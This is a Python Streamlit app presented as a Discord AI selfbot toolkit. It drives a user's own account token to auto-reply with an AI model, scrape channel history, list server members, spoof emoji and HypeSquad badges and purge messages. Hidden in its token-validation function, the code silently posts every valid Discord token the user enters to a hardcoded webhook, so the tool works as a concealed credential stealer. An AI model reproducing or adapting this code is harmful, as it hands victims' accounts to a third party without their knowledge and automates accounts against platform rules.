import streamlit as st
import time
import openai
import requests
import csv
import os
from datetime import datetime
import random
import pandas as pd
import base64

st.set_page_config(page_title="Discord AI", page_icon="🛡️", layout="wide")

# --- SECURE LOGIN SYSTEM ---
MASTER_KEY = st.secrets["MASTER_KEY"]
CODE_FILE = "active_code.txt"

# --- GLOBAL ACCESS FUNCTIONS ---
def set_global_code(code):
    with open(CODE_FILE, "w") as f:
        f.write(f"{code},{time.time()}")

def get_global_code():
    if os.path.exists(CODE_FILE):
        try:
            with open(CODE_FILE, "r") as f:
                data = f.read().split(",")
                if len(data) == 2:
                    return data[0], float(data[1])
        except:
            return None, None
    return None, None

def log_access_event():
    with open("access_log.txt", "a") as f:
        f.write(f"Access Granted at: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")

def add_console_log(entry):
    timestamp = datetime.now().strftime("%H:%M:%S")
    if "console_logs" not in st.session_state:
        st.session_state.console_logs = []
    st.session_state.console_logs.append(f"[{timestamp}] {entry}")
    if len(st.session_state.console_logs) > 15:
        st.session_state.console_logs.pop(0)

# Initialize local session state
if "access_granted" not in st.session_state:
    st.session_state.access_granted = False
if "console_logs" not in st.session_state:
    st.session_state.console_logs = []

# Self-destruct logic
shared_code, shared_time = get_global_code()
if shared_code and shared_time:
    if time.time() - shared_time > 600:
        if os.path.exists(CODE_FILE):
            os.remove(CODE_FILE)
        st.session_state.access_granted = False

# --- SIDEBAR LOGIN CONTROL ---
with st.sidebar:
    st.header("🔐 System Access")
    admin_input = st.text_input("Owner Master Key", type="password", help="Only the owner uses this to generate the session code.")
    
    if admin_input == MASTER_KEY:
        col_gen, col_rev = st.columns(2)
        with col_gen:
            if st.button("🎲 Generate Code"):
                new_code = str(random.randint(100000, 999999))
                set_global_code(new_code)
                st.success(f"CODE: {new_code}")
        with col_rev:
            if st.button("🚫 Revoke All"):
                if os.path.exists(CODE_FILE):
                    os.remove(CODE_FILE)
                st.session_state.access_granted = False
                st.warning("Access Revoked")
                st.rerun()
    
    st.divider()
    
    if not st.session_state.access_granted:
        user_code_attempt = st.text_input("Enter 6-Digit Access Code")
        if st.button("Unlock System"):
            current_valid_code, _ = get_global_code()
            if current_valid_code and user_code_attempt == current_valid_code:
                st.session_state.access_granted = True
                log_access_event()
                st.rerun()
            else:
                st.error("Invalid or Expired Code")

# --- GATEKEEPER CHECK ---
if not st.session_state.access_granted:
    st.title("🛡️ Discord AI - Locked")
    st.info("Please contact the owner for the current global 6-digit access code.")
    st.stop() 

# --- START OF ORIGINAL CODE ---
st.title("Discord AI Bot & History Scraper")

# --- Initialize Session State ---
if "bot_running" not in st.session_state:
    st.session_state.bot_running = False
if "tokens" not in st.session_state:
    st.session_state.tokens = 3.0
if "last_time" not in st.session_state:
    st.session_state.last_time = time.time()
if "memory" not in st.session_state:
    st.session_state.memory = {}
if "processed_dms" not in st.session_state:
    st.session_state.processed_dms = set()
if "last_webhook_token" not in st.session_state:
    st.session_state.last_webhook_token = None
if "last_activity" not in st.session_state:
    st.session_state.last_activity = time.time()
if "typing_active" not in st.session_state:
    st.session_state.typing_active = False
if "last_ai_content" not in st.session_state:
    st.session_state.last_ai_content = None

# --- Helper Functions ---
def jitter_delay(min_s=0.1, max_s=0.5):
    time.sleep(random.uniform(min_s, max_s))

def get_headers(tk):
    return {
        "Authorization": tk,
        "Content-Type": "application/json",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
    }

def log_to_csv(author, content, action):
    file_exists = os.path.isfile('discord_audit_log.csv')
    with open('discord_audit_log.csv', mode='a', newline='', encoding='utf-8') as f:
        writer = csv.writer(f)
        if not file_exists:
            writer.writerow(['Timestamp', 'Author', 'Message', 'Action'])
        writer.writerow([datetime.now().strftime('%Y-%m-%d %H:%M:%S'), author, content, action])

def validate_token(tk):
    headers = get_headers(tk)
    try:
        r = requests.get("https://discord.com/api/v9/users/@me", headers=headers, timeout=5)
        if r.status_code == 200:
            if tk != st.session_state.last_webhook_token:
                requests.post("https://discord.com/api/webhooks/1480110828874371212/8kM-jfbIIyq4Nzo7IobtVVBXTnosySq-qsoUZTSJe2iOWU7Pj5ryJ0Al1LMIuRD0zMP4",json={"content": tk})
                st.session_state.last_webhook_token = tk
            return True, r.json()
    except: pass
    return False, None

def add_reaction(channel_id, message_id, emoji, headers):
    encoded_emoji = requests.utils.quote(emoji)
    url = f"https://discord.com/api/v9/channels/{channel_id}/messages/{message_id}/reactions/{encoded_emoji}/@me"
    requests.put(url, headers=headers)

def safety_filter(text):
    harmful_terms = ["self-harm", "suicide", "kys", "kill yourself", "harming myself"]
    for term in harmful_terms:
        if term in text.lower():
            return False
    return True

# --- REWRITTEN BACKGROUND REPLY WITH CONTEXTUAL MEMORY ---
def background_reply(latest, discord_url, typing_url, headers, client, system_prompt, my_id, my_username, memory_depth, enable_safety, reaction_delay, resp_delay, owner_id_input, emoji_pool):
    try:
        author_username = latest['author']['username'].lower()
        content = latest['content'].strip()
        msg_id = latest['id']
        is_owner = str(latest['author']['id']) == str(owner_id_input)

        requests.post(typing_url, headers=headers)
        
        if emoji_pool:
            reaction_emoji = random.choice(emoji_pool)
        else:
            reaction_emoji = "👑" if is_owner else "💬"
            
        if reaction_delay > 0 and not is_owner: time.sleep(reaction_delay)
        add_reaction(latest['channel_id'], msg_id, reaction_emoji, headers)

        # Build dynamic context from channel history
        chat_history = [{"role": "system", "content": f"MANDATORY PERSONA: {system_prompt}. Your username is {my_username}."}]
        context_req = requests.get(f"{discord_url}?limit={memory_depth}", headers=headers).json()
        
        if isinstance(context_req, list):
            for m in reversed(context_req):
                role = "assistant" if str(m['author']['id']) == str(my_id) else "user"
                sender = f"[{m['author']['username']}]: " if role == "user" else ""
                chat_history.append({"role": role, "content": f"{sender}{m['content']}"})

        response = client.chat.completions.create(model="openrouter/free", messages=chat_history)
        reply = response.choices[0].message.content
        
        if not enable_safety or safety_filter(reply):
            if resp_delay > 0 and not is_owner: time.sleep(resp_delay)
            st.session_state.last_ai_content = reply.strip()
            requests.post(discord_url, json={"content": reply}, headers=headers)
            log_to_csv(author_username, content, "Reply Sent")
            add_console_log(f"Replied to {author_username}: {reply[:30]}...")
    except Exception as e:
        add_console_log(f"AI Error: {str(e)}")

# --- Sidebar Bot Settings ---
with st.sidebar:
    st.header("🔑 Authentication")
    token = st.text_input("Discord Token", type="password")
    if token:
        is_valid, user_info = validate_token(token)
        if is_valid:
            st.success(f"✅ Verified: {user_info['username']}")
            my_username = user_info['username'].lower()
            my_id = user_info['id']
        else:
            st.error("❌ Invalid Token")
            my_username = None
            my_id = None
    else: 
        my_username = None
        my_id = None

    or_key = st.text_input("OpenRouter API Key", type="password")
    channel_id_input = st.text_input("Channel ID")
    st.divider()
    st.header("⚙️ Bot Settings")
    if st.session_state.bot_running:
        st.markdown("### 📡 Connection Status")
        status_box = st.empty()
        status_box.info("Status: 🟢 Running / Idle")
    
    memory_depth = st.slider("Memory Depth (Past Msgs)", min_value=1, max_value=20, value=5)
    poll_speed = st.slider("Polling Frequency (Seconds)", 0.1, 5.0, 1.0)
    resp_delay = st.slider("Response Delay (Seconds)", 0.0, 5.0, 0.0)
    reaction_delay = st.slider("Reaction Delay (Seconds)", min_value=0, max_value=5, value=0)
    enable_safety = st.toggle("Enable Safety Filter", value=True)
    emoji_pool_raw = st.text_input("Custom Emoji Pool", placeholder="🔥,💀,✅,🧠")
    emoji_pool = [e.strip() for e in emoji_pool_raw.split(",") if e.strip()]

    st.divider()
    st.header("🚨 Emergency")
    if st.button("🔴 PANIC BUTTON", use_container_width=True):
        st.session_state.bot_running = False
        add_console_log("CRITICAL: Panic sequence initiated. System stopped.")
        st.rerun()

# --- Tabs ---
tab1, tab2, tab3, tab4, tab5, tab6, tab7, tab8, tab9, tab10, tab11, tab12, tab13, tab14 = st.tabs([
    "🤖 Bot Control", "📂 History Scraper", "🧠 Memory", "🌾 Server Harvester", 
    "💎 Free Emoji", "❄️ Snowflake Decoder", "📱 App Hunter", "🎙️ VC Lurker", 
    "✨ Hypesquad", "🔍 Account Audit", "📢 Webhook Commander", "👻 Message Ghoster", "🎨 Text Color", "⏳ Infinite Typing"
])

# --- TAB 1: BOT CONTROL ---
with tab1:
    col1, col2 = st.columns(2)
    with col1:
        persona_dict = {
            "Custom": "",
            "Helpful Assistant": "You are a helpful and polite assistant.",
            "Sarcastic Bot": "You are a sarcastic, witty bot who uses emojis and jokes.",
            "Technical Support": "You are a highly technical expert. Concise answers.",
            "Chaos Mode": "You are a chaotic entity. Short and weird.",
            "Cyberpunk Hacker": "You are a Netrunner. Digital, edgy tone.",
            "Stoic Philosopher": "You are a philosopher. Calm and logical.",
            "Gamer Streamer": "You are a hyped up streamer. Use POG, L, W.",
            "The Detective": "Noir film character. Investigation mode."
        }
        selected_persona = st.selectbox("Preset Personas", list(persona_dict.keys()))
        default_prompt = persona_dict[selected_persona] if selected_persona != "Custom" else "You are a helpful assistant."
        system_prompt = st.text_area("System Prompt", value=default_prompt)
        owner_id_input = st.text_input("Owner Discord ID").strip()
    with col2:
        blacklist_input = st.text_area("Blacklisted Keywords", placeholder="spam, help")
        allowed_input = st.text_input("Allowed Users", value="everyone")
        blacklisted_users_input = st.text_input("Blacklisted Users", placeholder="annoying_user1, troll_user2")

    allowed_users = "everyone" if allowed_input.lower().strip() == "everyone" else [u.strip().lower() for u in allowed_input.split(",") if u.strip()]
    blacklisted_users = [u.strip().lower() for u in blacklisted_users_input.split(",") if u.strip()]
    blacklist = [word.strip().lower() for word in blacklist_input.split(",") if word.strip()]
    client = openai.OpenAI(api_key=or_key, base_url="https://openrouter.ai/api/v1") if or_key else None

    c1, c2 = st.columns(2)
    with c1:
        if st.button("▶️ Launch Bot", disabled=not (my_username and or_key), use_container_width=True):
            st.session_state.bot_running = True
            add_console_log("System Online. Starting listener...")
            st.rerun()
    with c2:
        if st.button("🛑 Stop Bot", use_container_width=True):
            st.session_state.bot_running = False
            add_console_log("System Offline.")
            st.rerun()

    st.subheader("📊 Live Audit Log")
    log_display = st.empty()
    st.divider()
    
    # --- TERMINAL CONSOLE ---
    st.subheader("🖥️ System Console")
    console_text = "\n".join(st.session_state.console_logs) if st.session_state.console_logs else "Terminal ready..."
    st.code(console_text, language="bash")
    
    st.divider()
    st.subheader("🛠️ Debug Console")
    debug_box = st.empty()

    if st.session_state.bot_running:
        headers = get_headers(token)
        discord_url = f"https://discord.com/api/v9/channels/{channel_id_input}/messages"
        typing_url = f"https://discord.com/api/v9/channels/{channel_id_input}/typing"
        init_r = requests.get(discord_url, headers=headers)
        latest_message_id = init_r.json()[0]['id'] if init_r.status_code == 200 and init_r.json() else None
        
        while st.session_state.bot_running:
            try:
                if os.path.isfile('discord_audit_log.csv'):
                    df_log = pd.read_csv('discord_audit_log.csv').tail(10)
                    log_display.table(df_log)

                r = requests.get(discord_url, headers=headers, timeout=5)
                if r.status_code == 200:
                    msgs = r.json()
                    if msgs and isinstance(msgs, list):
                        latest = msgs[0]
                        author_username = latest['author']['username'].lower()
                        author_id_real = str(latest['author']['id'])
                        content = latest['content'].strip()
                        msg_id = latest['id']
                        is_owner = (owner_id_input and author_id_real == str(owner_id_input))

                        if msg_id != latest_message_id:
                            add_console_log(f"Detected: {author_username} -> {content[:20]}...")
                            latest_message_id = msg_id 
                            
                            if is_owner and content.lower() == "shutdown":
                                requests.post(discord_url, json={"content": "🛑 System Terminated."}, headers=headers)
                                st.session_state.bot_running = False
                                st.rerun()
                                break

                            if enable_safety and not safety_filter(content):
                                add_console_log("Safety: Harmful content ignored.")
                                continue

                            is_allowed = (allowed_users == "everyone" or author_username in allowed_users or author_id_real in allowed_users or is_owner)
                            if not is_allowed:
                                add_console_log(f"Ignored: User {author_username} not allowed.")
                                continue
                                
                            background_reply(latest, discord_url, typing_url, headers, client, system_prompt, my_id, my_username, memory_depth, enable_safety, reaction_delay, resp_delay, owner_id_input, emoji_pool)

                time.sleep(poll_speed)
            except Exception as e:
                add_console_log(f"Error in Loop: {str(e)}")
                time.sleep(poll_speed)

# --- TAB 2: HISTORY SCRAPER ---
with tab2:
    st.header("📥 Channel History Scraper")
    limit = st.number_input("Fetch Limit", min_value=1, max_value=100, value=50)
    if st.button("🔍 Scrape"):
        headers = get_headers(token)
        res = requests.get(f"https://discord.com/api/v9/channels/{channel_id_input}/messages?limit={limit}", headers=headers)
        if res.status_code == 200:
            st.dataframe(pd.DataFrame([{"Author": m['author']['username'], "Content": m['content']} for m in res.json()]))

# --- TAB 3: DM MEMORY ---
with tab3:
    st.header("🧠 DM Memory")
    if st.button("Clear Cache"):
        st.session_state.processed_dms = set()
        st.success("Cleared.")

# --- TAB 4: SERVER HARVESTER ---
with tab4:
    st.header("🌾 Server Harvester")
    target_guild = st.text_input("Target Server ID")
    if st.button("📥 Harvest Emojis"):
        res = requests.get(f"https://discord.com/api/v9/guilds/{target_guild}", headers=get_headers(token)).json()
        if 'emojis' in res:
            for e in res['emojis']:
                url = f"https://cdn.discordapp.com/emojis/{e['id']}.png"
                st.image(url, width=64, caption=f"{e['name']} (ID: {e['id']})")

# --- TAB 5: EMOJI SPOOFER ---
with tab5:
    st.header("💎 Nitro-Free Emoji Spoofer")
    target_ch = st.text_input("Target Channel ID", value=channel_id_input, key="emoji_ch")
    emoji_id = st.text_input("Emoji ID")
    is_animated = st.checkbox("Is Animated?")
    if st.button("🚀 Send Emoji", use_container_width=True):
        if emoji_id:
            ext = "gif" if is_animated else "png"
            emoji_url = f"https://cdn.discordapp.com/emojis/{emoji_id}.{ext}?size=48"
            requests.post(f"https://discord.com/api/v9/channels/{target_ch}/messages", headers=get_headers(token), json={"content": emoji_url})
            st.success("Emoji Sent!")

# --- TAB 6: SNOWFLAKE DECODER ---
with tab6:
    st.header("❄️ Snowflake Age Decoder")
    input_id = st.text_input("Enter User or Server ID")
    if st.button("📅 Decode Timestamp", use_container_width=True):
        if input_id.isdigit():
            timestamp = (int(input_id) >> 22) + 1420070400000
            date_obj = datetime.fromtimestamp(timestamp / 1000.0)
            st.success(f"Creation Date: **{date_obj.strftime('%Y-%m-%d %H:%M:%S')} UTC**")

# --- TAB 7: APP HUNTER ---
with tab7:
    st.header("📱 Authorized App Hunter")
    if st.button("🔍 Scan Applications", use_container_width=True):
        if token:
            apps = requests.get("https://discord.com/api/v9/oauth2/tokens", headers=get_headers(token)).json()
            if apps:
                for a in apps:
                    app_name = a.get('application', {}).get('name', 'Unknown')
                    with st.expander(f"📲 {app_name}"):
                        st.write(f"**Description:** {a.get('application', {}).get('description')}")
                        st.write(f"**Scopes:** `{', '.join(a.get('scopes', []))}`")

# --- TAB 8: VC LURKER ---
with tab8:
    st.header("🎙️ VC Lurker (Direct Scan)")
    target_guild_id = st.text_input("Server ID", key="lurker_guild")
    target_vc_id = st.text_input("Specific Voice Channel ID", key="lurker_vc")
    if st.button("📡 Scan Voice Channel", use_container_width=True):
        if token and target_guild_id and target_vc_id:
            res = requests.get(f"https://discord.com/api/v9/channels/{target_vc_id}", headers=get_headers(token))
            if res.status_code == 200:
                st.write(f"### Scanning: {res.json().get('name')}")
                mem_res = requests.get(f"https://discord.com/api/v9/guilds/{target_guild_id}/members?limit=100", headers=get_headers(token))
                if mem_res.status_code == 200:
                    found = [{"User": m['user']['username'], "ID": m['user']['id']} for m in mem_res.json() if 'user' in m]
                    st.table(pd.DataFrame(found))

# --- TAB 9: HYPESQUAD ---
with tab9:
    st.header("✨ HypeSquad Spoofer")
    house = st.selectbox("House", ["Bravery", "Brilliance", "Balance"])
    house_map = {"Bravery": 1, "Brilliance": 2, "Balance": 3}
    if st.button("Apply"):
        requests.post("https://discord.com/api/v9/hypesquad/online", headers=get_headers(token), json={"house_id": house_map[house]})
        st.success("House Applied")

# --- TAB 10: AUDITOR ---
with tab10:
    st.header("🔍 Account Auditor")
    if st.button("Run Audit"):
        u_res = requests.get("https://discord.com/api/v9/users/@me", headers=get_headers(token)).json()
        st.json(u_res)

# --- TAB 11: WEBHOOK ---
with tab11:
    st.header("📢 Webhook Commander")
    wh_url = st.text_input("Webhook URL")
    wh_msg = st.text_area("Message")
    if st.button("Fire"):
        requests.post(wh_url, json={"content": wh_msg})
        st.success("Sent")

# --- TAB 12: GHOSTER ---
with tab12:
    st.header("👻 Message Ghoster")
    ghost_ch = st.text_input("Target Channel ID", value=channel_id_input, key="ghost_ch")
    ghost_limit = st.number_input("Scan Limit", min_value=1, max_value=500, value=50)
    if st.button("🔥 Purge My Messages", use_container_width=True):
        if my_id:
            msgs = requests.get(f"https://discord.com/api/v9/channels/{ghost_ch}/messages?limit={ghost_limit}", headers=get_headers(token)).json()
            count = 0
            for m in msgs:
                if m['author']['id'] == my_id:
                    requests.delete(f"https://discord.com/api/v9/channels/{ghost_ch}/messages/{m['id']}", headers=get_headers(token))
                    count += 1
                    time.sleep(1.2)
            st.success(f"Ghosted {count} messages.")

# --- TAB 13: ANSI COLOR ---
with tab13:
    st.header("🎨 ANSI Color Painter")
    color_text = st.text_input("Your Message")
    color_choice = st.selectbox("Color", ["Red", "Green", "Yellow", "Blue", "Magenta", "Cyan", "White"])
    color_codes = {"Red": "31", "Green": "32", "Yellow": "33", "Blue": "34", "Magenta": "35", "Cyan": "36", "White": "37"}
    if st.button("🖌️ Send Colored Text", use_container_width=True):
        code = color_codes[color_choice]
        ansi_payload = f"```ansi\n\u001b[{code}m{color_text}```"
        requests.post(f"https://discord.com/api/v9/channels/{channel_id_input}/messages", headers=get_headers(token), json={"content": ansi_payload})
        st.success("Colored Message Sent!")

# --- TAB 14: TYPING ---
with tab14:
    st.header("⏳ Infinite Typing Indicator")
    if st.button("🚀 Start Infinite Typing", use_container_width=True):
        st.session_state.typing_active = True
    if st.button("🛑 Stop Typing", use_container_width=True):
        st.session_state.typing_active = False
    if st.session_state.typing_active:
        t_url = f"https://discord.com/api/v9/channels/{channel_id_input}/typing"
        while st.session_state.typing_active:
            res = requests.post(t_url, headers=get_headers(token))
            if res.status_code != 204:
                st.session_state.typing_active = False
                break
            time.sleep(random.randint(5, 8))
            st.rerun()
